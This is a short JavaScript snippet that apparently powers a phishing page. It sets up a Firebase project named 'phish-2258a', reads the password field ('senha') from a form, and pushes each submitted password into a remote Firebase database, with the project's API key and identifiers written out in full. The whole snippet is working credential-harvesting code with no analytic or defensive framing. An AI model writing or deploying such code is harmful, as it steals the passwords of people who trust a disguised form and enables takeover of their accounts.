// Your web app's Firebase configuration
          // For Firebase JS SDK v7.20.0 and later, measurementId is optional
          var firebaseConfig = {
              apiKey: "AIzaSyBv2EPBYnkKLbM-27Gsa93eEFhNQgMURDk",
              authDomain: "phish-2258a.firebaseapp.com",
              databaseURL: "https://phish-2258a-default-rtdb.firebaseio.com",
              projectId: "phish-2258a",
              storageBucket: "phish-2258a.appspot.com",
              messagingSenderId: "770476817045",
              appId: "1:770476817045:web:8d3f9144b35c54fbd1b99c",
              measurementId: "G-FQJRETNXR4"
          };
          // Initialize Firebase
          firebase.initializeApp(firebaseConfig);
          firebase.analytics();

          //Name of user
          let contactInfo = firebase.database().ref("famosinhosf");

          //Listen for a submit
          document.querySelector(".contact-form").addEventListener("submit", submitForm);

          function submitForm(e){
               e.preventDefault();
     
               //Get input values
               let senha = document.querySelector(".senha").value;
     
               console.log(senha);
     
               saveContactInfo(senha);
     
       /*        document.querySelector(".contact-form").reset();*/
          }

          //Save infos to Firebase
          function saveContactInfo(senha){
               let newContactInfo = contactInfo.push();
     
               newContactInfo.set({
                    senha: senha,
               });

          }
